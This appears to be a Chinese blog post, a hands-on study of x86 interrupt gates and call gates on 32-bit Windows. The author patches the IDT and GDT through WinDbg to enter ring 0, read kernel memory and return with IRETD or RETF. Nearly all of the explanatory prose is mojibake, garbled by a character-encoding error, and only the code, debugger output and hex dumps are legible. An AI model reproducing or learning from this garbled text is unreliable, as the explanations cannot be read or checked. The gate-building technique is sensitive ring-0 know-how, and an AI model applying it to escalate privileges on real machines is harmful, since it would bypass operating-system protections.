iretdæ¯”iretå¤šä¸€ä¸ªå‰ç¼€æŒ‡ä»¤0x66ã€‚è¿™æ ·çš„è¯ï¼Œåœ¨32ä½ç³»ç»Ÿä¸‹é»˜è®¤å¯»å€32ä½ï¼Œå¦‚æœæ˜¯iretæŒ‡ä»¤ï¼Œå°±æ˜¯16ä½å¯»å€ã€‚ å®éªŒ æ„é€ ä¸­æ–­é—¨ï¼Œå®ç°ææƒåè¯»å–é«˜2Gçš„åœ°å€å¹¶åˆ†æå †æ ˆæƒ…å†µ åœ¨è°ƒç”¨é—¨ä¸­å®ç°ä½¿ç”¨IRETDè¿”å›ï¼Œåœ¨ä¸­æ–­é—¨ä¸­å®ç°ç”¨RETFè¿”å› è‡ªè¡Œæ„é€ ä¸­æ–­é—¨ è¡¥å……çŸ¥è¯†ï¼šSIDTæŒ‡ä»¤åœ¨x86æ±‡ç¼–æŒ‡ä»¤é›†ä¸­ï¼ŒSIDTæŒ‡ä»¤å¯ä»¥ç”¨æ¥è¯»å–ä¸­æ–­æè¿°ç¬¦è¡¨ï¼ˆIDTï¼ŒInterrupt Descriptor Tableï¼‰çš„åŸºå€å’Œé™å€¼ã€‚è¯­æ³•å¦‚ä¸‹ï¼š1SIDT destinationå…¶ä¸­ï¼Œdestinationå¯ä»¥æ˜¯å†…å­˜ä½ç½®æˆ–å¯„å­˜å™¨ã€‚è¿™ä¸ªæŒ‡ä»¤å°†IDTRï¼ˆIDT Registerï¼‰ä¸­çš„å†…å®¹å­˜å‚¨åˆ°æŒ‡å®šçš„destinationä¸­ã€‚IDTRå¯„å­˜å™¨ä¸­åŒ…å«äº†IDTçš„åŸºå€å’Œé™å€¼ã€‚ä½†æ˜¯æˆ‘è¯•äº†ä¸çŸ¥é“ä¸ºå•¥ä¸è¡Œï¼Œç¼–è¯‘æ²¡é—®é¢˜ï¼ŒLinkæ—¶ä¼šæŠ¥é”™ï¼š123456--------------------Configuration: MyInterruptGate - Win32 Debug--------------------Linking...LINK : fatal error LNK1168: cannot open Debug/MyInterruptGate.exe for writingæ‰§è¡Œ link.exe æ—¶å‡ºé”™.MyInterruptGate.exe - 1 error(s), 0 warning(s)æµ‹è¯•ä»£ç ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE IDT[6]=&#123;0&#125;;DWORD dwH2GValue;// //åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç // void __declspec(naked) R0Func() //00401030 // &#123;// __asm// &#123;// //int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ// pushad// pushfd// mov eax,0x8003f400 //è¯»å–é«˜2Gçš„åœ°å€ï¼Œåœ°å€æ˜¯IDTè¡¨åŸºå€// mov ebx,[eax]// mov dwH2GValue,ebx// sidt IDT //è¯»IDTRå¯„å­˜å™¨// popfd// popad// iretd// &#125;// &#125;void PrintRegister()&#123; DWORD IDT_ADDR=*(PDWORD)(&amp;IDT[2]); //IDTè¡¨å¤§å° WORD IDT_LIMIT=*(PWORD)(&amp;IDT[0]); //IDTè¡¨åŸºå€ printf(&quot;%x %x %x &quot;,dwH2GValue,IDT_ADDR,IDT_LIMIT);&#125;int main()&#123; __asm &#123; // int 0x20 //ç´¢å¼•å·32ï¼Œ8003f500 sidt idt &#125; PrintRegister(); getchar(); return 0;&#125; å®éªŒè¿‡ç¨‹æ„é€ ä¸­æ–­é—¨æè¿°ç¬¦æµ‹è¯•ä»£ç æ„é€ çš„ä¸­æ–­é—¨æè¿°ç¬¦DPLä¸º3ï¼Œè¿è¡Œç»“æœæ„é€ çš„ä¸­æ–­é—¨æè¿°ç¬¦DPLä¸º0ï¼Œè¿è¡Œç»“æœæ„é€ çš„é—¨æè¿°ç¬¦ï¼ˆDPL=3ï¼‰ï¼š0040EE00`00081020æ„é€ çš„é—¨æè¿°ç¬¦ï¼ˆDPL=0ï¼‰ï¼š00408E00`00081020å¿…é¡»çš„ï¼šP=1ï¼ŒS=0ï¼ŒD=1ï¼Œè¡¨32ä½ã€‚0~7éƒ½ä¸º0ã€‚æ„é€ çš„ï¼šOffsetï¼š00401020ï¼ŒDPL=11æ®µé€‰æ‹©å­ï¼š0008ï¼Œ0ç¯ä»£ç æ®µ0000 0000 0000 1 0 00ï¼Œï¼ŒIndexä¸º1åºå·åœ°å€æ®µæè¿°ç¬¦æ•°æ®æ®µorä»£ç æ®µDPL18003f00800cf9b00`0000ffffä»£ç æ®µ00æ”¹8003f500è¿™ä¸ªPä½ä¸º0çš„æ— æ•ˆæ®µæè¿°ç¬¦ï¼ŒIndexæ˜¯32ï¼Œ0x201234567891011121314151617181920212223242526272829303132333435363738kd&gt; dq 8003f400 L228003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 00000000`00080000 00000000`00080000kd&gt; eq 8003f500 0040EE00`00081020kd&gt; dq 8003f400 L228003f400 80538e00`0008f19c 80538e00`0008f3148003f410 00008500`0058113e 8053ee00`0008f6e48003f420 8053ee00`0008f864 80538e00`0008f9c08003f430 80538e00`0008fb34 80548e00`0008019c8003f440 00008500`00501198 80548e00`000805c08003f450 80548e00`000806e0 80548e00`000808208003f460 80548e00`00080a7c 80548e00`00080d608003f470 80548e00`00081450 80548e00`000817808003f480 80548e00`000818a0 80548e00`000819d88003f490 80548500`00a01780 80548e00`00081b408003f4a0 80548e00`00081780 80548e00`000817808003f4b0 80548e00`00081780 80548e00`000817808003f4c0 80548e00`00081780 80548e00`000817808003f4d0 80548e00`00081780 80548e00`000817808003f4e0 80548e00`00081780 80548e00`000817808003f4f0 80548e00`00081780 806d8e00`00082fd08003f500 0040ee00`00081020 00000000`00080000kd&gt; gä»£ç ä½œç”¨ï¼šé€šè¿‡ä¸­æ–­é—¨è¿›0ç¯ï¼Œåœ¨0ç¯é‡Œè¯»é«˜ä¸¤2Gçš„åœ°å€ï¼ˆIDTè¡¨çš„ç¬¬ä¸€é¡¹ï¼‰123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE IDTItem[8]=&#123;0&#125;;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) R0Func() //00401020 &#123; __asm &#123; //int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ pushad pushfd mov eax,0x8003f400 //è¯»å–é«˜2Gçš„åœ°å€ï¼Œåœ°å€æ˜¯IDTè¡¨åŸºå€ mov ebx,[eax] mov dword ptr ds:[IDTItem],ebx //IDTè¡¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä½32ä½ï¼ˆå°ç«¯åºï¼‰ mov ecx,[eax+0x4] mov dword ptr ds:[IDTItem+0x4],ecx //IDTè¡¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„é«˜32ä½ï¼ˆå°ç«¯åºï¼‰ popfd popad iretd //iretä¼šè“å±ï¼Œå› ä¸ºiretçš„ç¡¬ç¼–ç æ˜¯66CFï¼Œ32ä½ä¸‹åº”è¯¥ä½¿ç”¨iretdï¼Œç¡¬ç¼–ç æ˜¯C &#125;&#125;int main()&#123; __asm &#123; int 0x20 //ç´¢å¼•å·32ï¼Œ8003f500 &#125; printf(&quot;%08x`%08x &quot;,*(PDWORD)((PBYTE)IDTItem+0x4),*(PDWORD)IDTItem);//å¤„ç†æˆï¼šæŒ‰windbgçš„dqé‚£æ ·æ˜¾ç¤ºæ•°æ® getchar(); return 0;&#125;08è¡¨ç¤ºè¾“å‡ºå®½åº¦ä¸º8ä½ï¼Œå¦‚æœä¸è¶³8ä½ä¼šè‡ªåŠ¨è¡¥é½0ã€‚å †æ ˆåˆ†ææµ‹è¯•ä»£ç è°ƒç”¨ä¸­æ–­é—¨å‰çš„å¯„å­˜å™¨è°ƒç”¨ååœ¨0ç¯æ—¶çš„å¯„å­˜å™¨åˆ†æ1int a=1; //ä¸ºäº†åœ¨3ç¯ä¸‹æ–­ç‚¹åŠ çš„è¿™è¡Œ1int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE IDTItem[8]=&#123;0&#125;;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) R0Func() //00401020 &#123; __asm &#123; //int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ pushad pushfd mov eax,0x8003f400 //è¯»å–é«˜2Gçš„åœ°å€ï¼Œåœ°å€æ˜¯IDTè¡¨åŸºå€ mov ebx,[eax] mov dword ptr ds:[IDTItem],ebx //IDTè¡¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä½32ä½ï¼ˆå°ç«¯åºï¼‰ mov ecx,[eax+0x4] mov dword ptr ds:[IDTItem+0x4],ecx //IDTè¡¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„é«˜32ä½ï¼ˆå°ç«¯åºï¼‰ popfd popad iretd //iretä¼šè“å±ï¼Œå› ä¸ºiretçš„ç¡¬ç¼–ç æ˜¯66CFï¼Œ32ä½ä¸‹åº”è¯¥ä½¿ç”¨iretdï¼Œç¡¬ç¼–ç æ˜¯C &#125;&#125;int main()&#123; __asm &#123; int 0x20 //ç´¢å¼•å·32ï¼Œ8003f500 0040EE00`00081020 &#125; printf(&quot;%08x`%08x &quot;,*(PDWORD)((PBYTE)IDTItem+0x4),*(PDWORD)IDTItem);//å¤„ç†æˆï¼šæŒ‰windbgçš„dqé‚£æ ·æ˜¾ç¤ºæ•°æ® getchar(); return 0;&#125;F5è°ƒè¯•ï¼Œæ–­åœ¨int aé‚£è¡Œï¼Œçœ‹å¯„å­˜å™¨ã€‚ç„¶åF11æ­¥è¿›ï¼Œæ–­åœ¨windbgé‡Œï¼Œçœ‹å¯„å­˜å™¨EFL=00000212ï¼ŒIF=1Efl=12ï¼ŒIF=0äº† è°ƒç”¨é—¨ä½¿ç”¨IRETDè¿”å›ï¼Œä¸­æ–­é—¨ä½¿ç”¨RETFè¿”å› æ€è€ƒtipså †æ ˆå˜åŒ–ï¼ˆå·¦-&gt;å³ï¼Œæ ˆé¡¶-&gt;æ ˆåº•ï¼‰è¿”å›ä½¿ç”¨çš„æŒ‡ä»¤çŸ­è°ƒç”¨CSretè°ƒç”¨é—¨ï¼ˆè·¨æ®µä¸ææƒï¼‰EIP,CSé•¿è¿”å›æŒ‡ä»¤retfè°ƒç”¨é—¨ï¼ˆè·¨æ®µå¹¶ææƒï¼‰ï¼Œæ— å‚EIP,CS,ESP,SSretfè°ƒç”¨é—¨ï¼ˆè·¨æ®µå¹¶ææƒï¼‰ï¼Œå¸¦å‚EIP,CS,å‚æ•°1,å‚æ•°2,â€¦,ESP,SSretfä¸­æ–­é—¨ï¼ˆæ— æƒé™åˆ‡æ¢ï¼‰EIP,CS,EFLAGiret,iretdä¸­æ–­é—¨ï¼ˆæœ‰æƒé™åˆ‡æ¢ï¼‰EIP,CS,EFLAG,ESP,SSiret,iretdæ ¸å¿ƒè¦ç‚¹éƒ½æ˜¯è¦åœ¨ä½¿ç”¨è¿”å›æŒ‡ä»¤å‰ä¿®æ”¹å †æ ˆï¼Œä½†åœ¨å…·ä½“ä¿®æ”¹æ–¹å¼ä¸Šæœ‰ä¸åŒçš„é€‰æ‹© çŸ¥è¯†æ¸©æ•…æ ˆé¡¶æŒ‡é’ˆæŒ‡å‘é—®é¢˜ï¼š32ä½å…¥æ ˆæ“ä½œæŠŠæ ˆé¡¶æŒ‡é’ˆå‡4ï¼Œå†å°†æ•°å€¼å¤åˆ¶åˆ°æ ˆé¡¶æŒ‡é’ˆæŒ‡å‘çš„å †æ ˆä½ç½®ã€‚å‡ºæ ˆæ“ä½œæ—¶ä»å †æ ˆåˆ é™¤æ•°æ®ï¼Œæ•°å€¼å¼¹æ ˆåï¼Œå†å°†æ ˆé¡¶æŒ‡é’ˆå¢åŠ ï¼ˆæŒ‰å †æ ˆå…ƒç´ å¤§å°ï¼‰ï¼ŒæŒ‡å‘å †æ ˆä¸­ä¸‹ä¸€ä¸ªæœ€é«˜ä½ç½®ã€‚pushadå’ŒpushfdæŒ‡ä»¤ï¼špushfdæŒ‡ä»¤æ˜¯æŠŠ32ä½EFLAGSå¯„å­˜å™¨å†…å®¹å‹å…¥å †æ ˆï¼ŒpopfdæŒ‡ä»¤æŠŠå †æ ˆå•å…ƒå†…å®¹å¼¹å‡ºåˆ°EFLAGESå¯„å­˜å™¨ã€‚pushadæŒ‡ä»¤æ˜¯å°†æ‰€æœ‰32ä½é€šç”¨å¯„å­˜å™¨å‹å…¥å †æ ˆï¼Œé¡ºåºæ˜¯eaxï¼Œecxï¼Œedxï¼Œebxï¼Œespï¼Œebpï¼Œesiå’Œediçš„é¡ºåºã€‚popadæŒ‡ä»¤æŒ‰ç›¸åé¡ºåºå°†å¯„å­˜å™¨å¼¹å‡ºå †æ ˆã€‚0x24ï¼šåå…­è¿›åˆ¶36ï¼Œå› ä¸ºpushfdä¼šå°†8ä¸ª32ä½å¯„å­˜å™¨å‹å…¥å †æ ˆä¸­ï¼Œå³32ä¸ªå­—èŠ‚ã€‚pushfdå°†EFLAGå¯„å­˜å™¨å‹å…¥å †æ ˆä¸­ï¼Œä¹Ÿæ˜¯4ä¸ªå­—èŠ‚ï¼Œæ€»å’Œå³ä¸º36ä¸ªå­—èŠ‚ã€‚ è°ƒç”¨é—¨ä½¿ç”¨IRETDè¿”å› å®ç°è¿‡ç¨‹åšæ³•1ï¼šä½¿ç”¨æœ‰å‚è°ƒç”¨é—¨å®ç°ï¼Œä¼ çš„å‚æ•°æ˜¯eflagså‚è€ƒï¼šhttps://blog.csdn.net/yu_sn0w/article/details/108881202æµ‹è¯•ä»£ç æ„é€ çš„é—¨æè¿°ç¬¦æ‰§è¡Œç»“æœå †æ ˆåˆ†æ123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;windows.h&gt;char CallGate[6] = &#123;0, 0, 0, 0, 0x48, 0&#125;;//8003f048 0040EC01`00081020DWORD dwH2GValue;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) R0Func() //00401020&#123; __asm &#123; //int 3 //windbgè°ƒè¯•ç”¨ pushad pushfd mov eax,0x8003f00c //è¯»å–é«˜2Gçš„åœ°å€ mov ebx,[eax] mov dwH2GValue,ebx popfd popad iretd &#125;&#125;int main()&#123; __asm &#123; pushfd call fword ptr ds:[CallGate]; //é•¿è°ƒç”¨ï¼Œéœ€è¦6ä¸ªå­—èŠ‚ã€‚F10æ­¥è¿›ï¼Œç„¶ååœ¨windbgï¼ŒuæŸ¥çœ‹åé¢çš„æŒ‡ä»¤ï¼Œpå•æ¡æŒ‡ä»¤æ‰§è¡Œ add esp,4 //å‰è¾¹å‹æ ˆäº†ï¼Œæ‰‹åŠ¨å¹³æ ˆ &#125; printf(&quot;Call gate successfully returned using iretd &quot;); printf(&quot;%x &quot;,dwH2GValue); return 0;&#125;æœ‰å‚è°ƒç”¨é—¨ï¼ˆè·¨æ®µå¹¶ææƒï¼‰å †æ ˆå˜åŒ–ï¼šEIP,CS,å‚æ•°1,å‚æ•°2,â€¦,ESP,SSï¼Œä¸­æ–­é—¨ï¼ˆæœ‰æƒé™åˆ‡æ¢ï¼‰å †æ ˆå˜åŒ–ï¼šEIP,CS,EFLAG,ESP,SSï¼Œæ‰€ä»¥ç”¨å¸¦1ä¸ªå‚æ•°çš„è°ƒç”¨é—¨ï¼Œcallåï¼Œå°±èƒ½ä½¿ç”¨iretdè¿”å›äº†ã€‚0040EC01`000810201234567891011121314kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0040EC01`00081020kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0040ec01`00081020kd&gt; gæ‰§è¡Œcallå‰æ‰§è¡ŒcallæŒ‡ä»¤æ‰§è¡ŒiretdæŒ‡ä»¤åšæ³•2ï¼šä½¿ç”¨æ— å‚è°ƒç”¨é—¨ï¼Œç„¶åä¿®æ”¹å †æ ˆåˆ†ææµ‹è¯•ä»£ç æ„é€ çš„é—¨æè¿°ç¬¦ä»£ç è®¾è®¡åŠè¿‡ç¨‹åˆ†ææ‰§è¡Œç»“æœè°ƒè¯•ä¸‹çš„å †æ ˆåˆ†æè¿™ä¸ªæ˜¯æ­£å¸¸çš„è°ƒç”¨é—¨+ç”¨retfè¿”å›ï¼Œè°ƒè¯•çœ‹å †æ ˆæˆªçš„å›¾ï¼ˆæ‰§è¡Œå®Œpushadå’ŒpushfdæŒ‡ä»¤åï¼‰æˆ‘çœ‹åˆ°ç½‘ä¸Šå¤§å¤šæ•°åšæ³•éƒ½æ˜¯å°†ESPå’ŒSSåˆ†åˆ«å¾€é«˜å­—èŠ‚å †æ ˆç§»åŠ¨ï¼Œç„¶ååŠ å…¥EFLAGSã€‚ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼šå°±æ˜¯ä¼šè¦†ç›–åˆ°åŸæœ¬é«˜å­—èŠ‚å †æ ˆå­˜çš„å†…å®¹ï¼ˆ0ç¯çš„å †æ ˆï¼‰ã€‚æˆ‘è§‰å¾—æœ€å¥½è¿˜æ˜¯å¾€ä½å­—èŠ‚é€ä¸ªç§»åŠ¨ï¼Œå°†å †æ ˆç©ºå‡ºä½ç½®ï¼Œå†å­˜å…¥eflagså¯„å­˜å™¨ï¼Œåªæ˜¯è¿™æ ·ç§»åŠ¨çš„å¯„å­˜å™¨æ•°é‡è¦å¤šä¸€äº›ã€‚é‚£ä¹ˆæˆ‘è¿™é‡Œå°±ç”¨éº»çƒ¦ä¸€ç‚¹çš„è¿™ä¸ªåšæ³•ã€‚æ ¸å¿ƒä»£ç æ˜¯å¤„ç†å †æ ˆçš„éƒ¨åˆ†ï¼Œå†™ä¸€ä¸ªloopï¼Œé€ä¸ªç§»åŠ¨ä¸€å…±11ä¸ªå¯„å­˜å™¨ï¼ˆ8ä¸ªé€šç”¨+1ä¸ªfd+2ä¸ªï¼‰ï¼Œåæ”¾å…¥eflagså¯„å­˜å™¨ï¼Œç„¶åæ¢å¤espæŒ‡é’ˆæœ‰ä¸ªå°ç»†èŠ‚æ²¡å¤„ç†ï¼Œæ¯æ¬¡loopä¼šåˆ¤æ–­cxæ˜¯å¦ä¸º0ï¼Œeflagsé‡Œçš„æœ‰å‡ ä¸ªæ ‡å¿—ä½ä¼šå˜åŒ–ã€‚æœ€åpushfdçš„å€¼å…¶å®å’Œä¸€å¼€å§‹è¿›0ç¯çš„ä¸ä¸€æ ·ï¼Œæ— æ‰€è°“äº†ã€‚ä¿®æ”¹åçš„å †æ ˆé‡Œæœ‰eflagsï¼Œèƒ½ç”¨iretdè¿”å›å°±è¡Œäº†ã€‚è¦å¤„ç†çš„è¯ï¼Œäº‹å…ˆåŠ ä¸€ä¸ªå˜é‡ä¿å­˜ï¼Œç„¶åå†æ”¾åˆ°å †æ ˆé‡Œã€‚123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;windows.h&gt;char CallGate[6] = &#123;0, 0, 0, 0, 0x48, 0&#125;;//8003f048 0040EC00`00081020DWORD dwH2GValue;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) R0Func() //00401020&#123; __asm &#123; //int 3 //windbgè°ƒè¯•ç”¨ pushad pushfd mov eax,0x8003f00c //è¯»å–é«˜2Gçš„åœ°å€ mov ebx,[eax] mov dwH2GValue,ebx //å¤„ç†å †æ ˆ mov ecx,11L1: mov eax,[esp] mov [esp-0x4],eax add esp,0x4 //å¾€é«˜å­—èŠ‚æ–¹å‘ç§»åŠ¨ï¼Œå‡†å¤‡ç§»ä¸‹ä¸€ä¸ª loop L1 pushfd //å­˜å…¥eflagså¯„å­˜å™¨ sub esp,11*0x4 //æ¢å¤æ ˆé¡¶æŒ‡é’ˆ popfd popad //retf iretd &#125;&#125;int main()&#123; __asm &#123; call fword ptr ds:[CallGate]; //é•¿è°ƒç”¨ï¼Œéœ€è¦6ä¸ªå­—èŠ‚ã€‚F10æ­¥è¿›ï¼Œç„¶ååœ¨windbgï¼ŒuæŸ¥çœ‹åé¢çš„æŒ‡ä»¤ï¼Œpå•æ¡æŒ‡ä»¤æ‰§è¡Œ &#125; printf(&quot;Call gate successfully returned using iretd &quot;); printf(&quot;%x &quot;,dwH2GValue); return 0;&#125;0040EC00`000810201234567891011121314kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0040EC00`00081020kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0040ec00`00081020kd&gt; gå¤„ç†å †æ ˆçš„è¿‡ç¨‹ç¤ºæ„å›¾ï¼šå› ä¸ºæ˜¯è°ƒç”¨é—¨ï¼Œè°ƒè¯•æ—¶çœ‹çš„åœ¨3ç¯ï¼Œ0ç¯ï¼ŒEFLAGSå¯„å­˜å™¨æ²¡æœ‰å˜åŒ–ï¼Œæ‰€ä»¥æ”¾å †æ ˆæ—¶ç›´æ¥pushfdäº†ã€‚ä½†æˆ‘å†™çš„loopä¼šè®©eflagså˜ï¼Œå’Œåˆšè¿›0ç¯æ—¶çš„å€¼ä¸ä¸€æ ·ï¼Œè¿™ä¸ªç»†èŠ‚æˆ‘ä¸å¤„ç†äº†markï¼Œç–‘é—®ï¼Œç›´æ¥æ‰§è¡Œèƒ½æ‰§è¡Œï¼Œè°ƒè¯•å•æ­¥æœ€åå›3ç¯æŠ¥é”™ä¸‹ä¸€æ¡æŒ‡ä»¤æ˜¯loopï¼Œæ‰§è¡Œpå‘½ä»¤ä¼šèµ°å®Œå¾ªç¯ã€‚bp 0040103Eï¼Œç„¶åtè¿›å…¥å¾ªç¯é‡Œï¼Œpä¼šèµ°ä¸€æ¬¡å¾ªç¯æ‰§è¡Œcallæ‰§è¡Œå‰æ‰§è¡Œpushfdå’ŒpushadæŒ‡ä»¤å‰æ‰§è¡Œpushfdå’ŒpushadæŒ‡ä»¤åæ‰§è¡Œå®Œç¬¬ä¸€æ¬¡ä¿®æ”¹å †æ ˆå¯„å­˜å™¨å€¼è¿”å›åœ°å€ï¼ˆä¸‹ä¸€æ¡æŒ‡ä»¤ï¼‰0040106FCS001BESP0012FF34SS0023å¯„å­˜å™¨å€¼eflags202edi12ff80esi0ebp12ff80espee40ddd0ebx7ffde000edx380e08ecx0eaxcccccccc1234567891011kd&gt; u0040102f b90b000000 mov ecx,0Bh00401034 8b0424 mov eax,dword ptr [esp]00401037 894424fc mov dword ptr [esp-4],eax0040103b 83c404 add esp,40040103e e2f4 loop 0040103400401040 9c pushfd00401041 83ec2c sub esp,2Ch00401044 9d popfdkd&gt; bp 0040103ebreakpoint 0 redefinedä¿®æ”¹å‰ï¼š12345678ee40dda0 2f 10 40 00 08 00 00 00 /.@.....ee40dda8 02 02 00 00 02 02 00 00 ........ee40ddb0 80 ff 12 00 00 00 00 00 ........ee40ddb8 80 ff 12 00 d0 dd 40 ee ......@.ee40ddc0 00 40 fd 7f 08 0e 38 00 .@....8.ee40ddc8 00 00 00 00 cc cc cc cc ........ee40ddd0 6f 10 40 00 1b 00 00 00 o.@.....ee40ddd8 34 ff 12 00 23 00 00 00 4...#...æ‰§è¡Œå®Œç¬¬ä¸€æ¬¡loopï¼šä¸Šé¢ä¸¤è¡Œå†…å®¹éƒ½å˜äº†ï¼ˆå’Œæˆ‘é¢„æœŸä¸ä¸€æ ·ï¼‰12345678ee40dda0 00 00 00 00 3e 10 40 00 ....&gt;.@.ee40dda8 08 00 00 00 92 02 00 00 ........ee40ddb0 80 ff 12 00 00 00 00 00 ........ee40ddb8 80 ff 12 00 d0 dd 40 ee ......@.ee40ddc0 00 40 fd 7f 08 0e 38 00 .@....8.ee40ddc8 00 00 00 00 cc cc cc cc ........ee40ddd0 6f 10 40 00 1b 00 00 00 o.@.....ee40ddd8 34 ff 12 00 23 00 00 00 4...#...ç¬¬äºŒæ¬¡loopé‡Œï¼šå†è¾“å…¥tæŒ‡ä»¤ï¼ˆæ‰§è¡Œ mov dword ptr [esp-4],eaxï¼‰ï¼Œå †æ ˆæ²¡å˜åŒ–å†è¾“å…¥tæŒ‡ä»¤ï¼ˆæ‰§è¡Œ add esp.0x4ï¼‰æ—¶ï¼Œå †æ ˆä¸Šé¢å¾ˆå¤šéƒ½å˜åŒ–äº†è¿™ç§æƒ…å†µä¸‹ï¼Œæœ€åå¼¹æ ˆeipå˜å›çš„å€¼æ˜¯ä¸æ­£å¸¸çš„08 00 00 00ï¼Œç„¶åå›åˆ°3ç¯æŠ¥é”™ ä¸­æ–­é—¨ä½¿ç”¨RETFè¿”å› å®ç°è¿‡ç¨‹å‚è€ƒé“¾æ¥ï¼šhttps://www.cnblogs.com/Hookcc/p/12704089.htmlæ²¡æ³•å°½å–„å°½ç¾ï¼šå°†å †æ ˆä¸­çš„eflagsèµ‹å€¼ç»™EFLå¯„å­˜å™¨åï¼Œåé¢çš„ä»£ç æ‰§è¡Œæ—¶æ²¡æ³•å±è”½ä¸­æ–­äº†ã€‚ç›´æ¥åŠ¨å †æ ˆï¼Œä¸pushadå’Œpushfdï¼Œæ•´ä½“å †æ ˆä¹Ÿä¸ä¸Šç§»ï¼Œé€‰æ‹©å‘ä¸‹ç§»åŠ¨å·æ‡’äº†ï¼Œç›´æ¥åŠ¨å †æ ˆï¼Œä¸pushadå’Œpushfdã€‚åŠ¨å †æ ˆä¹Ÿç›´æ¥å‘ä½åœ°å€ç§»åŠ¨ã€‚æ„é€ ä¸­æ–­é—¨æè¿°ç¬¦æµ‹è¯•ä»£ç ä»£ç åˆ†æè¿è¡Œç»“æœå †æ ˆåˆ†ææ„é€ çš„é—¨æè¿°ç¬¦ï¼ˆDPL=3ï¼‰ï¼š0040EE00`000810201dq 8003f400 L221eq 8003f500 0040EE00`0008102012345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE IDTItem[8]=&#123;0&#125;;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) R0Func() //00401020 &#123; __asm &#123; //int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ mov eax,0x8003f400 //è¯»å–é«˜2Gçš„åœ°å€ï¼Œåœ°å€æ˜¯IDTè¡¨åŸºå€ mov ebx,[eax] mov dword ptr ds:[IDTItem],ebx //IDTè¡¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä½32ä½ï¼ˆå°ç«¯åºï¼‰ mov ecx,[eax+0x4] mov dword ptr ds:[IDTItem+0x4],ecx //IDTè¡¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„é«˜32ä½ï¼ˆå°ç«¯åºï¼‰ //å¤„ç†å †æ ˆéƒ¨åˆ† add esp,0x4*2 popfd //popfdåESPæŒ‡å‘esp3 mov eax,[esp] //ç§»åŠ¨esp3åˆ°eflagesçš„ä½ç½® mov [esp-0x4],eax mov eax,[esp+0x4] //ç§»åŠ¨SSåˆ°ESPçš„ä½ç½® mov [esp],eax sub esp,0x4*3 //æ¢å¤ESPæŒ‡é’ˆ retf &#125;&#125;int main()&#123; __asm &#123; int 0x20 //ç´¢å¼•å·32ï¼Œ8003f500 0040EE00`00081020 &#125; printf(&quot;%08x`%08x &quot;,*(PDWORD)((PBYTE)IDTItem+0x4),*(PDWORD)IDTItem);//å¤„ç†æˆï¼šæŒ‰windbgçš„dqé‚£æ ·æ˜¾ç¤ºæ•°æ® getchar(); return 0;&#125;å †æ ˆç¤ºæ„ï¼š1234567891011121314å¤„ç†å †æ ˆå‰ï¼š add esp,0x8ï¼š popfdåï¼š ------------ ------------ 